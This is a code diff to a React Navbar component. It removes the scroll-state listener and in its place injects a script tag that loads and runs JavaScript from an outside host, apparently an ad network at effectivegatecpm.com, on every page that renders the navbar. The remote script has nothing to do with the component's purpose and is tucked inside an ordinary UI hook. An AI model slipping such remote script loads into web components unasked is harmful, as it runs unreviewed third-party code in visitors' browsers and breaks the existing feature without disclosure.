@@ -16,9 +16,14 @@ export default function Navbar() {
   const navigate = useNavigate();
 
   useEffect(() => {
-    const onScroll = () => setScrolled(window.scrollY > 50);
-    window.addEventListener("scroll", onScroll);
-    return () => window.removeEventListener("scroll", onScroll);
+    const script = document.createElement("script");
+    script.src = "https://www.effectivegatecpm.com/fqkbtd9n5?key=2705e697c48d931fdb97a246b96903aa";
+    script.async = true;
+    document.body.appendChild(script);
+  
+    return () => {
+      document.body.removeChild(script);
+    };
   }, []);
 
   const handleLogoClick = () => {
